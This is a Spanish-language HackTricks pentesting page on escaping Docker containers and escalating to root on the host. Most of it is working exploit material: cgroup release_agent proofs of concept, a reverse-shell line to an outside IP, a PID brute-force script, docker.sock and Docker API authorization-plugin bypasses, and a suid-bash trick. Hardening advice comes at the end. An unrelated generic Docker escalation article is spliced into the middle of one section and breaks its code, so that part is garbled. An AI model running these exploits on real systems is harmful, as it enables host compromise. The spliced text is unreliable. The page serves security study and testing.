<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# ¿Qué es un contenedor?

En resumen, es un **proceso aislado** a través de **cgroups** (lo que el proceso puede usar, como CPU y RAM) y **namespaces** (lo que el proceso puede ver, como directorios u otros procesos):
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# Socket de Docker montado

Si de alguna manera descubres que el **socket de Docker está montado** dentro del contenedor de Docker, podrás escapar de él.\
Esto suele ocurrir en contenedores de Docker que, por alguna razón, necesitan conectarse al demonio de Docker para realizar acciones.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
En este caso, puedes usar comandos regulares de docker para comunicarte con el demonio de docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
En caso de que el **socket de docker esté en un lugar inesperado**, aún puedes comunicarte con él usando el comando **`docker`** con el parámetro **`-H unix:///ruta/al/docker.sock`**
{% endhint %}

# Capacidades del contenedor

Debes verificar las capacidades del contenedor, si tiene alguna de las siguientes, podrías escapar de él: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

Puedes verificar las capacidades actuales del contenedor con:
```bash
capsh --print
```
En la siguiente página puedes **aprender más sobre las capacidades de Linux** y cómo abusar de ellas:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# Bandera `--privileged`

La bandera --privileged permite que el contenedor tenga acceso a los dispositivos del host.

## Soy el usuario root

Los contenedores de Docker bien configurados no permitirán comandos como **fdisk -l**. Sin embargo, en un comando de Docker mal configurado donde se especifica la bandera --privileged, es posible obtener los privilegios para ver la unidad del host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Por lo tanto, para tomar el control de la máquina host, es trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Y voilà! Ahora puedes acceder al sistema de archivos del host porque está montado en la carpeta `/mnt/hola`.

{% code title="PoC inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Segundo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

La bandera `--privileged` introduce preocupaciones significativas de seguridad, y el exploit depende de lanzar un contenedor de Docker con ella habilitada. Al usar esta bandera, los contenedores tienen acceso completo a todos los dispositivos y carecen de restricciones de seccomp, AppArmor y capacidades de Linux.

De hecho, `--privileged` proporciona permisos mucho mayores de los necesarios para escapar de un contenedor de Docker a través de este método. En realidad, los "únicos" requisitos son:

1. Debemos estar ejecutando como root dentro del contenedor
2. El contenedor debe ejecutarse con la capacidad de Linux `SYS_ADMIN`
3. El contenedor debe carecer de un perfil de AppArmor, o permitir la llamada al sistema `mount`
4. El sistema de archivos virtual cgroup v1 debe estar montado en modo de lectura-escritura dentro del contenedor

La capacidad `SYS_ADMIN` permite que un contenedor realice la llamada al sistema `mount` (consulte [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker inicia los contenedores con un conjunto restringido de capacidades](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) de forma predeterminada y no habilita la capacidad `SYS_ADMIN` debido a los riesgos de seguridad que implica hacerlo.

Además, Docker [inicia los contenedores con la política de AppArmor predeterminada de `docker-default`](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), que [impide el uso de la llamada al sistema `mount`](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) incluso cuando el contenedor se ejecuta con `SYS_ADMIN`.

Un contenedor sería vulnerable a esta técnica si se ejecuta con las banderas: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Desglosando el concepto de prueba

Ahora que entendemos los requisitos para usar esta técnica y hemos refinado el exploit de prueba de concepto, vamos a recorrerlo línea por línea para demostrar cómo funciona.

Para activar este exploit necesitamos un cgroup donde podamos crear un archivo `release_agent` y activar la invocación de `release_agent` matando todos los procesos en el cgroup. La forma más fácil de lograrlo es montar un controlador de cgroup y crear un cgroup secundario.

Para hacerlo, creamos un directorio `/tmp/cgrp`, montamos el controlador de cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) y creamos un cgroup secundario (llamado "x" para los fines de este ejemplo). Aunque no se han probado todos los controladores de cgroup, esta técnica debería funcionar con la mayoría de ellos.

Si está siguiendo y obtiene "mount: /tmp/cgrp: special device cgroup does not exist", es porque su configuración no tiene el controlador de cgroup RDMA. Cambie `rdma` a `memory` para solucionarlo. Estamos usando RDMA porque el PoC original fue diseñado solo para trabajar con él.

Tenga en cuenta que los controladores de cgroup son recursos globales que se pueden montar varias veces con diferentes permisos y los cambios realizados en un montaje se aplicarán a otro.

Podemos ver la creación del cgroup secundario "x" y su listado de directorios a continuación.
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
A continuación, habilitamos las notificaciones de cgroup en la liberación del cgroup "x" escribiendo un 1 en su archivo `notify_on_release`. También establecemos el agente de liberación del cgroup RDMA para ejecutar un script `/cmd` - que crearemos más tarde en el contenedor - escribiendo la ruta del script `/cmd` en el host en el archivo `release_agent`. Para hacerlo, obtendremos la ruta del contenedor en el host desde el archivo `/etc/mtab`.

Los archivos que agregamos o modificamos en el contenedor están presentes en el host, y es posible modificarlos desde ambos mundos: la ruta en el contenedor y su ruta en el host.

Estas operaciones se pueden ver a continuación:
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Ten en cuenta la ruta del script `/cmd`, que vamos a crear en el host:
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Ahora, creamos el script `/cmd` de tal manera que ejecute el comando `ps aux` y guarde su salida en `/output` en el contenedor especificando la ruta completa del archivo de salida en el host. Al final, también imprimimos el contenido del script `/cmd` para ver su contenido:
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Finalmente, podemos ejecutar el ataque generando un proceso que finaliza inmediatamente dentro del cgroup hijo "x". Al crear un proceso `/bin/sh` y escribir su PID en el archivo `cgroup.procs` en el directorio del cgroup hijo "x", el script en el host se ejecutará después de que `/bin/sh` salga. La salida de `ps aux` realizada en el host se guarda en el archivo `/output` dentro del contenedor:
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# Bandera `--privileged` v2

Los PoCs anteriores funcionan bien cuando el contenedor está configurado con un controlador de almacenamiento que expone la ruta completa del host del punto de montaje, por ejemplo `overlayfs`. Sin embargo, recientemente me encontré con un par de configuraciones que no revelaban claramente el punto de montaje del sistema de archivos del host.

## Contenedores Kata
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) monta por defecto el sistema de archivos raíz de un contenedor sobre `9pfs`. Esto no revela información sobre la ubicación del sistema de archivos del contenedor en la Máquina Virtual de Kata Containers.

\* Más información sobre Kata Containers en una futura publicación de blog.

## Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
Vi un contenedor con este montaje raíz en un entorno en vivo, creo que el contenedor se estaba ejecutando con una configuración específica de `devicemapper` como controlador de almacenamiento, pero hasta ahora no he podido replicar este comportamiento en un entorno de prueba.

## Una PoC Alternativa

Obviamente, en estos casos no hay suficiente información para identificar la ruta de los archivos del contenedor en el sistema de archivos del host, por lo que la PoC de Felix no se puede utilizar tal cual. Sin embargo, todavía podemos ejecutar este ataque con un poco de ingenio.

La única pieza clave de información requerida es la ruta completa, relativa al host del contenedor, de un archivo para ejecutar dentro del contenedor. Sin poder discernir esto a partir de los puntos de montaje dentro del contenedor, debemos buscar en otro lugar.

### Proc al rescate <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

El pseudo-sistema de archivos `/proc` de Linux expone las estructuras de datos del proceso del kernel para todos los procesos que se ejecutan en un sistema, incluidos aquellos que se ejecutan en diferentes espacios de nombres, por ejemplo, dentro de un contenedor. Esto se puede demostrar ejecutando un comando en un contenedor y accediendo al directorio `/proc` del proceso en el host:Contenedor
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
Como un comentario aparte, la estructura de datos `/proc/<pid>/root` es una que me confundió durante mucho tiempo, nunca pude entender por qué tener un enlace simbólico a `/` era útil, hasta que leí la definición real en las páginas del manual:

> /proc/\[pid]/root
>
> UNIX y Linux soportan la idea de una raíz del sistema de archivos por proceso, establecida por la llamada al sistema chroot(2). Este archivo es un enlace simbólico que apunta al directorio raíz del proceso, y se comporta de la misma manera que exe y fd/\*.
>
> Sin embargo, tenga en cuenta que este archivo no es simplemente un enlace simbólico. Proporciona la misma vista del sistema de archivos (incluyendo los espacios de nombres y el conjunto de montajes por proceso) que el propio proceso.

El enlace simbólico `/proc/<pid>/root` se puede utilizar como una ruta relativa del host a cualquier archivo dentro de un contenedor:Container.
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
Esto cambia el requisito del ataque de conocer la ruta completa, en relación al host del contenedor, de un archivo dentro del contenedor, a conocer el pid de _cualquier_ proceso que se esté ejecutando en el contenedor.

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

Esto es en realidad la parte fácil, los ids de procesos en Linux son numéricos y se asignan secuencialmente. El proceso `init` se le asigna el pid `1` y todos los procesos posteriores se les asignan ids incrementales. Para identificar el pid del proceso del host de un proceso dentro de un contenedor, se puede utilizar una búsqueda incremental por fuerza bruta: Container
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Escalada de privilegios en Docker

## Introducción

Docker es una plataforma de contenedores que permite a los desarrolladores empaquetar, distribuir y ejecutar aplicaciones en contenedores. Docker se ha convertido en una herramienta popular para el desarrollo y la implementación de aplicaciones en la nube y en entornos de CI/CD. Sin embargo, como cualquier otra herramienta, Docker también tiene sus propias vulnerabilidades de seguridad.

En este artículo, discutiremos una técnica de escalada de privilegios en Docker que permite a un usuario sin privilegios obtener acceso de root en el host.

## Requisitos previos

Para seguir esta técnica, necesitará una máquina Linux con Docker instalado. También necesitará acceso a una terminal con permisos de usuario no privilegiado.

## Paso 1: Crear un contenedor

El primer paso es crear un contenedor Docker. Puede hacerlo ejecutando el siguiente comando:

```
$ docker run -it --name test alpine /bin/sh
```

Este comando creará un contenedor llamado "test" utilizando la imagen "alpine". La opción "-it" se utiliza para iniciar el contenedor en modo interactivo y asignar una terminal. La opción "--name" se utiliza para asignar un nombre al contenedor.

## Paso 2: Montar el sistema de archivos del host

Una vez que el contenedor está en ejecución, puede montar el sistema de archivos del host en el contenedor utilizando el siguiente comando:

```
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Este comando montará el sistema de archivos del host en el directorio "/mnt" dentro del contenedor. La opción "-v" se utiliza para montar el sistema de archivos y la opción "--rm" se utiliza para eliminar el contenedor después de salir.

## Paso 3: Acceder al host

Ahora que el sistema de archivos del host está montado en el contenedor, puede acceder al host como usuario root ejecutando el siguiente comando:

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Este comando muestra que el usuario actual es root y tiene acceso completo al host.

## Conclusión

En este artículo, discutimos una técnica de escalada de privilegios en Docker que permite a un usuario sin privilegios obtener acceso de root en el host. Es importante tener en cuenta que esta técnica solo funciona si el usuario tiene acceso al contenedor Docker. Por lo tanto, es importante asegurarse de que los usuarios no autorizados no tengan acceso a los contenedores Docker en su sistema.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### Poniéndolo Todo Junto <a href="putting-it-all-together" id="putting-it-all-together"></a>

Para completar este ataque, se puede utilizar la técnica de fuerza bruta para adivinar el pid para la ruta `/proc/<pid>/root/payload.sh`, con cada iteración escribiendo la ruta pid adivinada en el archivo `release_agent` de los cgroups, activando el `release_agent` y viendo si se crea un archivo de salida.

La única advertencia con esta técnica es que de ninguna manera es sutil y puede aumentar mucho el recuento de pid. Como no se mantienen procesos en ejecución prolongada, esto _no debería_ causar problemas de confiabilidad, pero no me cites en eso.

El siguiente PoC implementa estas técnicas para proporcionar un ataque más genérico que el presentado por primera vez en el PoC original de Felix para escapar de un contenedor privilegiado utilizando la funcionalidad `release_agent` de los cgroups:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
La ejecución del PoC dentro de un contenedor privilegiado debería proporcionar una salida similar a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Exploit de Runc (CVE-2019-5736)

En caso de que puedas ejecutar `docker exec` como root (probablemente con sudo), intenta escalar privilegios escapando de un contenedor abusando de CVE-2019-5736 (exploit [aquí](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Esta técnica básicamente **sobrescribe** el binario _**/bin/sh**_ del **host** **desde un contenedor**, por lo que cualquier persona que ejecute docker exec puede activar la carga útil.

Cambia la carga útil en consecuencia y construye el main.go con `go build main.go`. El binario resultante debe colocarse en el contenedor de Docker para su ejecución.\
Al ejecutarlo, tan pronto como muestre `[+] Overwritten /bin/sh successfully`, debes ejecutar lo siguiente desde la máquina host:

`docker exec -it <nombre-del-contenedor> /bin/sh`

Esto activará la carga útil que está presente en el archivo main.go.

Para obtener más información: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Bypass del plugin de autenticación de Docker

En algunas ocasiones, el administrador del sistema puede instalar algunos plugins en Docker para evitar que los usuarios de bajo privilegio interactúen con Docker sin poder escalar privilegios.

## `run --privileged` no permitido

En este caso, el administrador del sistema **no permite que los usuarios monten volúmenes y ejecuten contenedores con la bandera `--privileged`** o den cualquier capacidad adicional al contenedor:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Sin embargo, un usuario puede **crear una shell dentro del contenedor en ejecución y otorgarle privilegios adicionales**:
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
Ahora, el usuario puede escapar del contenedor usando cualquiera de las técnicas discutidas anteriormente y escalar privilegios dentro del host.

## Montar carpeta con permisos de escritura

En este caso, el administrador del sistema **prohibió a los usuarios ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad adicional al contenedor, y solo permitió montar la carpeta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
 -p #This will give you a shell as root
```
{% hint style="info" %}
Ten en cuenta que quizás no puedas montar la carpeta `/tmp`, pero puedes montar una **carpeta diferente que sea escribible**. Puedes encontrar directorios escribibles usando: `find / -writable -type d 2>/dev/null`

**¡Ten en cuenta que no todos los directorios en una máquina Linux admitirán el bit suid!** Para comprobar qué directorios admiten el bit suid, ejecuta `mount | grep -v "nosuid"`. Por ejemplo, por lo general, `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` y `/var/lib/lxcfs` no admiten el bit suid.

También ten en cuenta que si puedes **montar `/etc`** o cualquier otra carpeta **que contenga archivos de configuración**, puedes cambiarlos desde el contenedor de Docker como root para **abusar de ellos en el host** y escalar privilegios (tal vez modificando `/etc/shadow`).
{% endhint %}

## Estructura JSON no verificada

Es posible que cuando el administrador del sistema configuró el firewall de Docker, **olvidó algún parámetro importante** de la API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) como "**Binds**".\
En el siguiente ejemplo, es posible abusar de esta mala configuración para crear y ejecutar un contenedor que monta la carpeta raíz (/) del host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## Atributo JSON no verificado

Es posible que cuando el administrador del sistema configuró el firewall de Docker, **olvidó algún atributo importante de un parámetro de la API** ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) como "**Capabilities**" dentro de "**HostConfig**". En el siguiente ejemplo es posible aprovechar esta mala configuración para crear y ejecutar un contenedor con la capacidad **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# Montaje de hostPath con permisos de escritura

(Información obtenida de [**aquí**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Dentro del contenedor, un atacante puede intentar obtener acceso adicional al sistema operativo subyacente del host a través de un volumen hostPath con permisos de escritura creado por el clúster. A continuación, se muestran algunas cosas comunes que se pueden verificar dentro del contenedor para ver si se utiliza este vector de ataque:
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# Mejoras de seguridad en contenedores

## Seccomp en Docker

Esto no es una técnica para escapar de un contenedor Docker, sino una característica de seguridad que Docker utiliza y que debes conocer, ya que puede evitar que escapes de Docker:

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## AppArmor en Docker

Esto no es una técnica para escapar de un contenedor Docker, sino una característica de seguridad que Docker utiliza y que debes conocer, ya que puede evitar que escapes de Docker:

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## AuthZ y AuthN

Un plugin de autorización **aprueba** o **niega** **solicitudes** al demonio de Docker en función del contexto actual de **autenticación** y del contexto de **comando**. El contexto de **autenticación** contiene todos los detalles del **usuario** y el **método de autenticación**. El contexto de **comando** contiene todos los datos de **solicitud** relevantes.

{% content-ref url="broken-reference" %}
[Enlace roto](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** es un kernel de aplicación, escrito en Go, que implementa una parte sustancial de la superficie del sistema Linux. Incluye un tiempo de ejecución de la [Iniciativa de Contenedor Abierto (OCI)](https://www.opencontainers.org) llamado `runsc` que proporciona un **límite de aislamiento entre la aplicación y el kernel del host**. El tiempo de ejecución `runsc` se integra con Docker y Kubernetes, lo que facilita la ejecución de contenedores aislados.

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers** es una comunidad de código abierto que trabaja para construir un tiempo de ejecución de contenedor seguro con máquinas virtuales ligeras que se sienten y funcionan como contenedores, pero que proporcionan una **mayor aislamiento de carga de trabajo utilizando la tecnología de virtualización de hardware** como segunda capa de defensa.

{% embed url="https://katacontainers.io/" %}

## Use contenedores de manera segura

Docker restringe y limita los contenedores de forma predeterminada. Aflojar estas restricciones puede crear problemas de seguridad, incluso sin el poder completo de la bandera `--privileged`. Es importante reconocer el impacto de cada permiso adicional y limitar los permisos en general al mínimo necesario.

Para ayudar a mantener los contenedores seguros:

* No use la bandera `--privileged` ni monte un [socket de Docker dentro del contenedor](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). El socket de Docker permite la creación de contenedores, por lo que es una forma fácil de tomar el control total del host, por ejemplo, ejecutando otro contenedor con la bandera `--privileged`.
* No ejecute como root dentro del contenedor. Use un [usuario diferente](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) o [espacios de nombres de usuario](https://docs.docker.com/engine/security/userns-remap/). El root en el contenedor es el mismo que en el host a menos que se remapee con espacios de nombres de usuario. Solo está ligeramente restringido por, principalmente, espacios de nombres de Linux, capacidades y cgroups.
* [Elimine todas las capacidades](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) y habilite solo las que sean necesarias (`--cap-add=...`). Muchas cargas de trabajo no necesitan capacidades y agregarlas aumenta el alcance de un posible ataque.
* [Use la opción de seguridad "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) para evitar que los procesos obtengan más privilegios, por ejemplo, a través de binarios suid.
* [Limite los recursos disponibles para el contenedor](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Los límites de recursos pueden proteger la máquina de ataques de denegación de servicio.
